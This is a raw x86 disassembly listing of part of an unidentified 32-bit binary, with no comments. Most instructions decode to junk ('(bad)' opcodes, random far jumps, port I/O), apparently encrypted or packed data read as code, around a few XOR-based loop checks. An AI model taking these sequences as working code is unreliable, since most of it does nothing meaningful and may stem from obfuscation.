  40cfe8:	sub    BYTE PTR [ebx-0x1fc02e65],dh
  40cfee:	outs   dx,BYTE PTR ds:[esi]
  40cfef:	cmp    DWORD PTR [ebp+0x664b1cad],ecx
  40cff5:	sbb    BYTE PTR [ebx-0x61d68957],bh
  40cffb:	jle    0x40d00f
  40cffd:	lods   eax,DWORD PTR ds:[esi]
  40cffe:	push   edi
  40cfff:	and    bl,BYTE PTR [ebx]
  40d001:	dec    edi
  40d002:	sbb    al,0x8b
  40d004:	leave  
  40d005:	push   edi
  40d006:	(bad)  
  40d007:	mov    ecx,DWORD PTR [ebx-0x2fcc2383]
  40d00d:	add    edx,ecx
  40d00f:	imul   edx,edi
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	dec    esp
  40d024:	pusha  
  40d025:	jle    0x40d039
  40d027:	xchg   ecx,eax
  40d028:	lahf   
  40d029:	jl     0x40d0a7
  40d02b:	retf   0x7c79
  40d02e:	jl     0x40d048
  40d030:	cmp    BYTE PTR [edi],bl
  40d032:	pop    esp
  40d033:	mov    gs,ebx
  40d035:	xchg   edx,eax
  40d036:	push   ebp
  40d037:	xor    edi,DWORD PTR [esi+0x27]
  40d03a:	mov    ebp,0xbd851705
  40d03f:	xchg   esp,eax
  40d040:	(bad)
  40d043:	sub    eax,0x8f2e910
  40d048:	ins    BYTE PTR es:[edi],dx
  40d049:	mov    ecx,0xfc605eff
  40d04e:	nop
  40d04f:	push   esp
  40d050:	sub    DWORD PTR [edi],0x5ed43c54
  40d056:	and    al,BYTE PTR [eax+0x76]
  40d059:	push   0xffffffff
  40d05b:	pop    ss
  40d05c:	inc    ecx
  40d05d:	cmp    edx,DWORD PTR [ebp-0x5778171d]
  40d063:	adc    bh,BYTE PTR [ebp-0x2f]
  40d066:	ror    DWORD PTR [ecx+0x3f],1
  40d069:	pop    ss
  40d06a:	sbb    DWORD PTR [esi+ecx*4-0x4d],ecx
  40d06e:	cmp    dh,0xfc
  40d071:	mov    dh,0xf9
  40d073:	cwde   
  40d074:	scas   eax,DWORD PTR es:[edi]
  40d075:	int    0x8d
  40d077:	inc    ebx
  40d078:	outs   dx,BYTE PTR ds:[esi]
  40d079:	pop    ds
  40d07a:	fisubr DWORD PTR ds:0x29199720
  40d080:	mov    dl,0x1a
  40d082:	imul   ecx,DWORD PTR [eax+0xd],0x7f
  40d086:	dec    edi
  40d087:	xor    al,0x2f
  40d089:	mov    bl,0xe7
  40d08b:	cmp    eax,0x5ce3a50a
  40d090:	aaa    
  40d091:	fbstp  TBYTE PTR [ebp+0x5d]
  40d094:	test   DWORD PTR [edi+0x4f],ebx
  40d097:	in     al,0xe0
  40d099:	sub    BYTE PTR [ecx+ebx*1],ah
  40d09c:	mov    ebx,0x1ec8aecb
  40d0a1:	fist   DWORD PTR [ecx-0x1d3dc738]
  40d0a7:	cld    
  40d0a8:	dec    edx
  40d0a9:	test   BYTE PTR [edi-0xd278bbf],cl
  40d0af:	in     eax,dx
  40d0b0:	xchg   edi,eax
  40d0b1:	inc    edx
  40d0b2:	or     edx,esi
  40d0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b5:	mov    dh,0x73
  40d0b7:	lea    edx,[eax]
  40d0b9:	scas   al,BYTE PTR es:[edi]
  40d0ba:	aam    0xa
  40d0bc:	push   ebx
  40d0bd:	jnp    0x40d04d
  40d0bf:	push   es
  40d0c0:	adc    ah,BYTE PTR [eax-0x52]
  40d0c3:	add    BYTE PTR [edx],bl
  40d0c5:	div    DWORD PTR [ecx+0xa6b1755]
  40d0cb:	ds jb  0x40d13d
  40d0ce:	mov    edi,0x146ef215
  40d0d3:	xor    eax,0x595ee83c
  40d0d8:	xor    BYTE PTR [edi+0x5c6880ac],bl
  40d0de:	(bad)  
  40d0df:	aam    0x59
  40d0e1:	aaa    
  40d0e2:	cwde   
  40d0e3:	mov    al,0x10
  40d0e5:	fs mov al,0xc5
  40d0e8:	and    BYTE PTR [edi+0x7abd03e5],bl
  40d0ee:	cmp    eax,0xaacaf159
  40d0f3:	cld    
  40d0f4:	fld    TBYTE PTR [eax-0x64]
  40d0f7:	inc    edi
  40d0f8:	daa    
  40d0f9:	cmp    BYTE PTR [edi],bl
  40d0fb:	and    esi,ebp
  40d0fd:	fdivr  st(1),st
  40d0ff:	retf   
  40d100:	repnz adc bl,bl
  40d103:	jns    0x40d0dd
  40d105:	(bad)  
  40d106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d107:	imul   ecx,DWORD PTR [edi-0x4],0x28
  40d10b:	push   ss
  40d10c:	mov    ebp,0xe8c6b23b
  40d111:	push   esi
  40d112:	jne    0x40d0b3
  40d114:	shr    DWORD PTR [edi+eax*1-0x40],1
  40d118:	lahf   
  40d119:	push   esi
  40d11a:	mov    ebp,DWORD PTR [eax]
  40d11c:	add    edi,eax
  40d11e:	or     al,0x2
  40d120:	int3   
  40d121:	imul   esi,DWORD PTR [ebx+0x1e],0xffffff9a
  40d125:	mov    dh,0xa8
  40d127:	pop    esp
  40d128:	jg     0x40d0b4
  40d12a:	or     ebp,DWORD PTR [ecx]
  40d12c:	mov    al,ds:0xfb210b0c
  40d131:	ins    BYTE PTR es:[edi],dx
  40d132:	je     0x40d15e
  40d134:	mov    al,0x81
  40d136:	dec    ebx
  40d137:	js     0x40d0eb
  40d139:	imul   ebx,DWORD PTR [ebp-0x767ce1e],0xffffff91
  40d140:	mov    esp,0xf85fedd8
  40d145:	int    0xef
  40d147:	test   DWORD PTR [eax+ecx*8+0x25],esi
  40d14b:	and    eax,0xcf3003ff
  40d150:	sbb    BYTE PTR [eax],al
  40d152:	mov    ah,0x3a
  40d154:	rcl    BYTE PTR [eax],0x9
  40d157:	dec    ebp
  40d158:	call   0xf362044c
  40d15d:	repz jns 0x40d10c
  40d160:	mov    edx,0xec92955d
  40d165:	dec    edi
  40d166:	imul   ecx,DWORD PTR [ecx],0x74
  40d169:	mov    bl,BYTE PTR cs:[esi+ecx*8-0x10]
  40d16e:	out    dx,al
  40d16f:	mov    eax,0x904603d0
  40d174:	nop
  40d175:	cli    
  40d176:	mov    ds:0xc6adbb43,eax
  40d17b:	mov    eax,0xf01ff4cd
  40d180:	bound  ecx,QWORD PTR [eax+0x3d1745ad]
  40d186:	daa    
  40d187:	les    ebx,FWORD PTR [eax+0x39]
  40d18a:	pop    ebp
  40d18b:	inc    ebx
  40d18c:	shl    DWORD PTR [esi-0x43e0aacb],1
  40d192:	popf   
  40d193:	and    al,0xbf
  40d195:	shl    BYTE PTR ss:[ebx],1
  40d198:	test   DWORD PTR [ebx+edx*2+0x6ed7b267],ebp
  40d19f:	sbb    eax,DWORD PTR [ebp+eiz*1-0x7c0b7dff]
  40d1a6:	mov    bh,0xe8
  40d1a8:	out    0x83,al
  40d1aa:	les    edx,FWORD PTR [eax+edx*8]
  40d1ad:	dec    edx
  40d1ae:	and    BYTE PTR [esi],0xe0
  40d1b1:	mov    esi,0xe260c0b3
  40d1b6:	cmc    
  40d1b7:	mov    al,0x7d
  40d1b9:	pop    esp
  40d1ba:	add    dl,BYTE PTR [edi-0x18]
  40d1bd:	dec    esi
  40d1be:	push   edx
  40d1bf:	mov    dl,0x64
  40d1c1:	arpl   WORD PTR [ebp-0x6e3f7202],ax
  40d1c7:	mov    eax,0x4d7e1afd
  40d1cc:	fwait
  40d1cd:	or     ah,dl
  40d1cf:	pushf  
  40d1d0:	push   ecx
  40d1d1:	pop    ebp
  40d1d2:	xchg   ecx,eax
  40d1d3:	mov    BYTE PTR [ebx-0x5683318d],cl
  40d1d9:	sti    
  40d1da:	aam    0xea
  40d1dc:	pop    edx
  40d1dd:	mov    ebp,0xcfded33e
  40d1e2:	ss lahf 
  40d1e4:	xor    BYTE PTR [ebx],ch
  40d1e6:	mov    ds:0xd4e067f8,al
  40d1eb:	popa   
  40d1ec:	or     al,0x43
  40d1ee:	jno    0x40d24c
  40d1f0:	lds    esi,FWORD PTR [ebx+0x30fd2497]
  40d1f6:	cmp    al,BYTE PTR [eax]
  40d1f8:	ss xchg esp,eax
  40d1fa:	push   edx
  40d1fb:	das    
  40d1fc:	enter  0xd00,0x48
  40d200:	xchg   ecx,eax
  40d201:	int    0xb4
  40d203:	and    BYTE PTR [ebp-0x62bab6a3],ch
  40d209:	cmpxchg DWORD PTR [ecx+0x2fc0daee],ecx
  40d210:	cdq    
  40d211:	leave  
  40d212:	jg     0x40d1ab
  40d214:	lahf   
  40d215:	mov    ebp,0xbb13403a
  40d21a:	in     eax,dx
  40d21b:	add    al,0x78
  40d21d:	std    
  40d21e:	aas    
  40d21f:	fistp  WORD PTR [esi+0x18]
  40d222:	scas   al,BYTE PTR es:[edi]
  40d223:	rcr    esp,0x6b
  40d226:	rcr    DWORD PTR [ecx+0xb],cl
  40d229:	imul   edx,DWORD PTR [ebx-0x65d184e],0x3d
  40d230:	sub    al,0x98
  40d232:	inc    edx
  40d233:	test   eax,0xd2d23dea
  40d238:	je     0x40d29f
  40d23a:	cmp    DWORD PTR [esi+0x27],ebp
  40d23d:	jo     0x40d1da
  40d23f:	mov    esp,0xb40c1aa2
  40d244:	and    DWORD PTR ds:0xdff06a5,esi
  40d24a:	pop    esi
  40d24b:	and    bh,BYTE PTR [ebx]
  40d24d:	jg     0x40d2bb
  40d24f:	cmp    al,0xaa
  40d251:	(bad)  
  40d252:	xor    cl,BYTE PTR [eax+0x36d32e61]
  40d258:	mov    dl,0xe2
  40d25a:	inc    ecx
  40d25b:	push   edi
  40d25c:	(bad)  
  40d25d:	inc    edi
  40d25e:	das    
  40d25f:	pop    edx
  40d260:	mov    eax,ds:0x8e20bab3
  40d265:	inc    ecx
  40d266:	leave  
  40d267:	pop    eax
  40d268:	dec    esp
  40d269:	dec    ecx
  40d26a:	pop    ebx
  40d26b:	mov    bh,0x3
  40d26d:	xor    DWORD PTR [ebx+0x5c],esp
  40d270:	jo     0x40d285
  40d272:	loop   0x40d2a1
  40d274:	(bad)  
  40d275:	push   eax
  40d276:	xchg   esi,eax
  40d277:	adc    dl,BYTE PTR [edi]
  40d279:	push   ds
  40d27a:	in     eax,0x44
  40d27c:	addr16 das 
  40d27e:	add    DWORD PTR ds:0xb165af79,esi
  40d284:	jnp    0x40d254
  40d286:	mov    edi,0x7cfb6d02
  40d28b:	mov    ah,BYTE PTR [edi-0x71df0130]
  40d291:	dec    ebx
  40d292:	bound  esp,QWORD PTR [edx+eax*1+0xd0dc1d1]
  40d299:	ds mov ecx,0x4722ef6b
  40d29f:	daa    
  40d2a0:	dec    ebx
  40d2a1:	out    dx,al
  40d2a2:	outs   dx,DWORD PTR ds:[esi]
  40d2a3:	sub    eax,0x15975872
  40d2a8:	mov    al,0x4a
  40d2aa:	les    edx,FWORD PTR [si-0x7b]
  40d2ae:	or     eax,0x746fdf60
  40d2b3:	in     al,dx
  40d2b4:	bnd ja 0x40d2cf
  40d2b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2b8:	pop    edi
  40d2b9:	cmp    edi,ecx
  40d2bb:	lock cmp DWORD PTR ds:[edx+0x71a0395a],esi
  40d2c3:	mov    al,ds:0x44201a04
  40d2c8:	and    DWORD PTR [edi+0x72f9e17],edi
  40d2ce:	push   esp
  40d2cf:	lahf   
  40d2d0:	mov    ah,0xb4
  40d2d2:	and    ecx,DWORD PTR [edx-0x5e32c89e]
  40d2d8:	aas    
  40d2d9:	test   eax,0x2495414b
  40d2de:	out    0x1d,eax
  40d2e0:	sbb    BYTE PTR [edx+esi*4+0x55],0x16
  40d2e5:	dec    ebp
  40d2e6:	push   ecx
  40d2e7:	ret    
  40d2e8:	or     BYTE PTR [ebp+0x32],al
  40d2eb:	(bad)  
  40d2ec:	out    dx,eax
  40d2ed:	call   0x218c21bd
  40d2f2:	push   ebx
  40d2f3:	outs   dx,DWORD PTR ds:[esi]
  40d2f4:	bound  edi,QWORD PTR [ebp+0x42]
  40d2f7:	jle    0x40d2f6
  40d2f9:	cwde   
  40d2fa:	imul   edi,DWORD PTR [esi+0x5f541215],0x49
  40d301:	cdq    
  40d302:	mov    DWORD PTR [ebx],ebp
  40d304:	mov    ah,0x81
  40d306:	test   eax,esp
  40d308:	imul   BYTE PTR [ecx-0x2e]
  40d30b:	xchg   esi,eax
  40d30c:	ins    DWORD PTR es:[edi],dx
  40d30d:	pop    eax
  40d30e:	xchg   edi,eax
  40d30f:	pop    ebp
  40d310:	dec    esp
  40d311:	mov    DWORD PTR [ebp+0x68],eax
  40d314:	gs xchg ecx,eax
  40d316:	(bad)  
  40d317:	mov    ebp,0x5a2c3c8f
  40d31c:	xor    BYTE PTR [eax],bl
  40d31e:	out    dx,al
  40d31f:	push   es
  40d320:	fimul  WORD PTR [edi+0x2edfb7dd]
  40d326:	int3   
  40d327:	cli    
  40d328:	repz adc ah,BYTE PTR [edx+0x102b5f7f]
  40d32f:	or     eax,0x7a0b33ba
  40d334:	sub    esi,DWORD PTR [edi]
  40d336:	fsub   QWORD PTR [ebp+ecx*4-0x4bc7e85f]
  40d33d:	cwde   
  40d33e:	xchg   edx,eax
  40d33f:	push   ss
  40d340:	je     0x40d399
  40d342:	in     eax,dx
  40d343:	mov    bl,0x17
  40d345:	pop    ecx
  40d346:	jo     0x40d2f4
  40d348:	mov    ah,BYTE PTR [eax+ebx*8+0x51e88ec7]
  40d34f:	dec    esp
  40d350:	mov    ebp,0xd5d76ec4
  40d355:	js     0x40d33f
  40d357:	inc    esp
  40d358:	scas   eax,DWORD PTR es:[edi]
  40d359:	int3   
  40d35a:	mov    WORD PTR [esi+ebx*8+0x77],es
  40d35e:	test   BYTE PTR [ebx+0xbc7938b],0x76
  40d365:	in     eax,dx
  40d366:	jmp    0x40d3c7
  40d368:	test   al,0x28
  40d36a:	sbb    DWORD PTR [ecx+0x1a],edx
  40d36d:	pop    esi
  40d36e:	stc    
  40d36f:	add    cl,BYTE PTR [ebx-0x29]
  40d372:	call   0xd78b:0x50eec213
  40d379:	imul   esp,DWORD PTR ds:0xc868a432,0xc58eee1d
  40d383:	xor    al,0x89
  40d385:	mov    edi,DWORD PTR [ebp-0xc]
  40d388:	xor    edi,eax
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	pop    edx
  40d3c7:	outs   dx,DWORD PTR ds:[esi]
  40d3c8:	sub    DWORD PTR [ebp+0x7c7c986f],eax
  40d3ce:	retf   0x7c79
  40d3d1:	jl     0x40d3a9
  40d3d3:	idiv   ebp
  40d3d5:	or     DWORD PTR [eax+0x21d84766],ebp
  40d3db:	xchg   edi,eax
  40d3dc:	clc    
  40d3dd:	hlt    
  40d3de:	pop    edi
  40d3df:	lods   al,BYTE PTR ds:[esi]
  40d3e0:	in     eax,dx
  40d3e1:	add    BYTE PTR [eax],cl
  40d3e3:	cmp    DWORD PTR [esi],ebp
  40d3e5:	and    dl,dh
  40d3e7:	retf   
  40d3e8:	adc    al,0xa9
  40d3ea:	pop    es
  40d3eb:	ss popf 
  40d3ed:	push   es
  40d3ee:	cwde   
  40d3ef:	test   eax,0x97d211cc
  40d3f4:	ins    BYTE PTR es:[edi],dx
  40d3f5:	mov    al,0xa0
  40d3f7:	jmp    0x23f7:0x90e01a5a
  40d3fe:	mov    edi,DWORD PTR [ebp+0x6b4c8c4e]
  40d404:	pop    edi
  40d405:	cmp    ah,ch
  40d407:	xchg   esp,eax
  40d408:	out    dx,eax
  40d409:	icebp  
  40d40a:	pusha  
  40d40b:	div    DWORD PTR [esi]
  40d40d:	and    al,0xef
  40d40f:	jp     0x40d46a
  40d411:	out    dx,al
  40d412:	inc    edx
  40d413:	pop    ss
  40d414:	dec    esp
  40d415:	sub    BYTE PTR [edi],ch
  40d417:	sub    edi,edx
  40d419:	(bad)  [ecx]
  40d41b:	mov    ebp,0x1c69c3db
  40d420:	xchg   ebx,eax
  40d421:	dec    edx
  40d422:	jecxz  0x40d3ec
  40d424:	mov    edi,0x624f7e97
  40d429:	pop    ebx
  40d42a:	sti    
  40d42b:	shl    BYTE PTR [ecx-0x7f],0x65
  40d42f:	sub    DWORD PTR [esi+0xa],0x52ebbe45
  40d436:	rol    DWORD PTR [ebp+0xb62fa27],cl
  40d43c:	mov    BYTE PTR [ebp+0x7e61cf30],dl
  40d442:	(bad)  [edx+0x12]
  40d445:	push   esp
  40d446:	push   ds
  40d447:	mov    eax,ds:0xcc8913b7
  40d44c:	mov    esp,DWORD PTR [ebp+0x41ddb76a]
  40d452:	stos   BYTE PTR es:[edi],al
  40d453:	jge    0x40d4a7
  40d455:	xor    DWORD PTR [edi-0x27],ebx
  40d458:	cdq    
  40d459:	das    
  40d45a:	clc    
  40d45b:	pop    eax
  40d45c:	dec    esi
  40d45d:	mov    dh,0x24
  40d45f:	call   0xd200be1c
  40d464:	jns    0x40d4d7
  40d466:	mov    dh,0x54
  40d468:	fild   QWORD PTR [esi-0x7c]
  40d46b:	pop    eax
  40d46c:	push   ecx
  40d46d:	jl     0x40d41c
  40d46f:	repz scas al,BYTE PTR es:[edi]
  40d471:	inc    esi
  40d472:	lock mov BYTE PTR ds:0x8165db0e,bh
  40d479:	repnz inc esp
  40d47b:	mov    eax,ds:0x33099050
  40d480:	jl     0x40d419
  40d482:	sbb    al,0x28
  40d484:	test   dl,bl
  40d486:	pop    ss
  40d487:	iret   
  40d488:	push   edx
  40d489:	add    al,ch
  40d48b:	ret    
  40d48c:	jmp    0x4713:0x73e1742b
  40d493:	or     bh,BYTE PTR ds:0xc67afade
  40d499:	pop    ss
  40d49a:	dec    esi
  40d49b:	ins    BYTE PTR es:[edi],dx
  40d49c:	cmc    
  40d49d:	cmp    ecx,0xffffffad
  40d4a0:	nop
  40d4a1:	(bad)  [ebx]
  40d4a3:	mov    fs,WORD PTR [eax-0x732d82cf]
  40d4a9:	ror    BYTE PTR [ebp+0x4caea9a],0xad
  40d4b0:	or     eax,0x929b2bd5
  40d4b5:	lock or eax,0xea22c074
  40d4bb:	mov    cl,BYTE PTR [esi-0x646cb93a]
  40d4c1:	inc    ebp
  40d4c2:	cmp    al,0x90
  40d4c4:	loop   0x40d4b1
  40d4c6:	imul   ebp,DWORD PTR [edx-0x52],0xffffffd1
  40d4ca:	(bad)  
  40d4cb:	push   ds
  40d4cc:	in     eax,0xb1
  40d4ce:	aas    
  40d4cf:	push   eax
  40d4d0:	jbe    0x40d4c4
  40d4d2:	inc    edi
  40d4d3:	dec    edx
  40d4d4:	outs   dx,DWORD PTR ds:[esi]
  40d4d5:	push   edi
  40d4d6:	rcl    ecx,cl
  40d4d8:	add    BYTE PTR [ecx+0x6c],ch
  40d4db:	mov    BYTE PTR [ebx],dl
  40d4dd:	xchg   BYTE PTR [ebx-0x516991dd],bh
  40d4e3:	popa   
  40d4e4:	cld    
  40d4e5:	jmp    0x40d4ad
  40d4e7:	mov    bl,0xd6
  40d4e9:	mov    eax,0x98b8e42a
  40d4ee:	retf   
  40d4ef:	mov    al,ds:0x9ee15d9e
  40d4f4:	loop   0x40d4c0
  40d4f6:	add    BYTE PTR [eax],0x87
  40d4f9:	sti    
  40d4fa:	mov    edi,ebp
  40d4fc:	fdiv   DWORD PTR [ecx+0x209049ec]
  40d502:	push   ecx
  40d503:	out    0xf6,al
  40d505:	sbb    esp,DWORD PTR [esi]
  40d507:	int3   
  40d508:	xchg   DWORD PTR [esi-0x7b],esp
  40d50b:	xor    ecx,DWORD PTR [edx-0x19491768]
  40d511:	cdq    
  40d512:	(bad)  
  40d513:	xor    eax,0x91ba61bf
  40d518:	les    eax,FWORD PTR [edi-0x5e54d731]
  40d51e:	jnp    0x40d53c
  40d520:	sbb    eax,0x4e687993
  40d525:	in     eax,dx
  40d526:	push   ecx
  40d527:	pop    ebx
  40d528:	pop    ecx
  40d529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d52a:	daa    
  40d52b:	mov    ecx,es
  40d52d:	imul   esp,esp,0xe1a88e7b
  40d533:	mov    ds:0xdb79fe97,eax
  40d538:	mov    dh,0x23
  40d53a:	or     ah,BYTE PTR [esi+eax*1+0x3e]
  40d53e:	mov    eax,0xd5f43d9d
  40d543:	(bad)  
  40d544:	ins    BYTE PTR es:[edi],dx
  40d545:	push   es
  40d546:	scas   eax,DWORD PTR es:[edi]
  40d547:	cmp    DWORD PTR [ebx+0x2fd71f94],esi
  40d54d:	rcr    BYTE PTR [edx+0x67],cl
  40d550:	inc    ebp
  40d551:	aas    
  40d552:	mov    al,ds:0x7b8bb988
  40d557:	push   ebx
  40d558:	cwde   
  40d559:	das    
  40d55a:	or     dh,bl
  40d55c:	add    BYTE PTR [esp+edx*1],0x86
  40d560:	repnz mov ch,BYTE PTR [ecx]
  40d563:	aaa    
  40d564:	fs push esi
  40d566:	call   0xdece:0x58e9eaeb
  40d56d:	jecxz  0x40d556
  40d56f:	call   0x6f4a:0x2c5a3483
  40d576:	rcl    BYTE PTR [ebp+0x3632f985],1
  40d57c:	fisubr WORD PTR [edx+ecx*1]
  40d57f:	in     eax,dx
  40d580:	and    BYTE PTR [ebp-0x4fc2aefc],cl
  40d586:	sbb    ebx,DWORD PTR [edi]
  40d588:	and    al,0x86
  40d58a:	cdq    
  40d58b:	ds jmp 0x2346a27b
  40d591:	ja     0x40d534
  40d593:	mov    eax,ds:0xbfbaaa38
  40d598:	jl     0x40d598
  40d59a:	loopne 0x40d56f
  40d59c:	and    al,0x93
  40d59e:	lahf   
  40d59f:	pop    edx
  40d5a0:	xor    DWORD PTR [eax+0x25],eax
  40d5a3:	sub    eax,0x47ccfc72
  40d5a8:	dec    eax
  40d5a9:	jne    0x40d557
  40d5ab:	xchg   BYTE PTR [eax-0x1e4a4438],ch
  40d5b1:	xor    bh,BYTE PTR [ebx]
  40d5b3:	inc    eax
  40d5b4:	test   DWORD PTR [eax-0x612fd08f],ebx
  40d5ba:	fs hlt 
  40d5bc:	imul   esi,DWORD PTR [eax-0x5e5e8af6],0x7eb019f8
  40d5c6:	scas   al,BYTE PTR es:[edi]
  40d5c7:	dec    ebx
  40d5c8:	push   ebx
  40d5c9:	sub    DWORD PTR [ecx+ebx*8+0x35e5686f],eax
  40d5d0:	fcmovne st,st(7)
  40d5d2:	loopne 0x40d56c
  40d5d4:	arpl   sp,ax
  40d5d6:	or     eax,0x7d0cb6c1
  40d5db:	inc    eax
  40d5dc:	push   es
  40d5dd:	addr16 inc esp
  40d5df:	pop    ds
  40d5e0:	mov    ecx,0x1a6ece7e
  40d5e5:	dec    edi
  40d5e6:	leave  
  40d5e7:	cdq    
  40d5e8:	int3   
  40d5e9:	scas   al,BYTE PTR es:[edi]
  40d5ea:	fiadd  WORD PTR ds:0x7473305e
  40d5f0:	mov    ebp,0x15ef1d78
  40d5f5:	push   0xa66b4db9
  40d5fa:	lods   al,BYTE PTR ds:[esi]
  40d5fb:	ret    
  40d5fc:	ins    DWORD PTR es:[edi],dx
  40d5fd:	jmp    0x40d5f1
  40d5ff:	retf   0x25e1
  40d602:	test   BYTE PTR [esi],dh
  40d604:	inc    edx
  40d605:	mov    al,ds:0xbe2805a7
  40d60a:	test   BYTE PTR [eax+0x17],ah
  40d60d:	pop    ss
  40d60e:	inc    esp
  40d60f:	leave  
  40d610:	xchg   ebp,eax
  40d611:	lods   al,BYTE PTR ds:[esi]
  40d612:	outs   dx,DWORD PTR ds:[esi]
  40d613:	inc    ebx
  40d614:	xor    ebp,DWORD PTR [ecx-0x5722922]
  40d61a:	fxch   st(5)
  40d61c:	and    BYTE PTR [edx],cl
  40d61e:	cmp    dh,BYTE PTR [ecx-0x17]
  40d621:	js     0x40d66c
  40d623:	(bad)  
  40d624:	popf   
  40d625:	imul   DWORD PTR [esi+0x6c087d9d]
  40d62b:	lds    esp,FWORD PTR [ebx-0x66]
  40d62e:	lds    ebx,FWORD PTR [ebx*1-0x17a99b48]
  40d635:	push   0xd4e68641
  40d63a:	ss mov esi,0xa75d182b
  40d640:	and    al,0xf4
  40d642:	or     eax,0x2c658648
  40d647:	shl    DWORD PTR [edi-0x16435f59],1
  40d64d:	inc    edi
  40d64e:	xor    al,0x99
  40d650:	cld    
  40d651:	fisub  DWORD PTR [ebx]
  40d653:	jp     0x40d6c4
  40d655:	xor    ecx,DWORD PTR [edi+0x32]
  40d658:	sub    bl,bl
  40d65a:	jmp    0x9c986fbf
  40d65f:	popa   
  40d660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d661:	xor    eax,0x8b8b1b27
  40d666:	mov    cl,0xfa
  40d668:	ffreep st(6)
  40d66a:	add    bl,bh
  40d66c:	jl     0x40d6d6
  40d66e:	inc    ebp
  40d66f:	add    cl,cl
  40d671:	mov    edi,0x415a7515
  40d676:	push   0x63
  40d678:	pusha  
  40d679:	sub    eax,ebx
  40d67b:	jmp    0xc56e:0x6bbac0a4
  40d682:	pushf  
  40d683:	pop    edi
  40d684:	shl    DWORD PTR [edi-0x40],0x4f
  40d688:	std    
  40d689:	xchg   esp,eax
  40d68a:	xor    al,bh
  40d68c:	pop    ss
  40d68d:	clc    
  40d68e:	popf   
  40d68f:	fild   WORD PTR [esi-0x20df791]
  40d695:	dec    esi
  40d696:	(bad)
  40d699:	pop    ecx
  40d69a:	or     DWORD PTR [ecx+0x6e],esi
  40d69d:	mov    BYTE PTR [eax+eax*1+0x6557656c],dl
  40d6a4:	cmp    DWORD PTR [edx+0x3339b74f],ebx
  40d6aa:	xchg   edx,eax
  40d6ab:	js     0x40d690
  40d6ad:	inc    edi
  40d6ae:	dec    ebp
  40d6af:	inc    eax
  40d6b0:	fwait
  40d6b1:	call   0xed32:0x1d2131c5
  40d6b8:	lods   eax,DWORD PTR ds:[esi]
  40d6b9:	ins    DWORD PTR es:[edi],dx
  40d6ba:	lea    ebx,[eax]
  40d6bc:	add    al,0x5e
  40d6be:	clc    
  40d6bf:	cmp    ebp,esi
  40d6c1:	push   ebp
  40d6c2:	xlat   BYTE PTR ds:[ebx]
  40d6c3:	imul   DWORD PTR [edi]
  40d6c5:	jmp    0x450a:0xa6f5d498
  40d6cc:	cli    
  40d6cd:	mov    esp,0x80e24475
  40d6d2:	inc    esi
  40d6d3:	push   es
  40d6d4:	mov    ds,edx
  40d6d6:	sub    ch,BYTE PTR [esi+0x59]
  40d6d9:	adc    dh,BYTE PTR [edx]
  40d6db:	popa   
  40d6dc:	(bad)
  40d6e0:	and    BYTE PTR es:[ebp+0x46],dl
  40d6e4:	cdq    
  40d6e5:	jae    0x40d698
  40d6e7:	in     eax,dx
  40d6e8:	fisttp QWORD PTR [esi+0x39]
  40d6eb:	jmp    FWORD PTR [edx]
  40d6ed:	cwde   
  40d6ee:	(bad)  
  40d6ef:	push   es
  40d6f0:	iret   
  40d6f1:	stc    
  40d6f2:	jg     0x40d6d8
  40d6f4:	leave  
  40d6f5:	stos   BYTE PTR es:[edi],al
  40d6f6:	sub    dl,BYTE PTR [edi+0x1a]
  40d6f9:	sub    al,0xfb
  40d6fb:	imul   ecx,DWORD PTR [edi],0xf660b05b
  40d701:	icebp  
  40d702:	xchg   esp,eax
  40d703:	shl    DWORD PTR [eax+0x12],1
  40d706:	xchg   ebx,eax
  40d707:	push   esp
  40d708:	mov    al,0xd1
  40d70a:	icebp  
  40d70b:	jmp    0x1c754149
  40d710:	inc    ebx
  40d711:	push   cs
  40d712:	enter  0x2e95,0x1a
  40d716:	out    0xcb,eax
  40d718:	ins    DWORD PTR es:[edi],dx
  40d719:	dec    esp
  40d71a:	push   eax
  40d71b:	and    al,0xc
  40d71d:	dec    edi
  40d71e:	jmp    0x3d75:0xf825788
  40d725:	test   DWORD PTR [ebx+0x1a],esp
  40d728:	xor    edx,eax
  40d72a:	add    edx,ecx
  40d72c:	imul   edx,edi
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
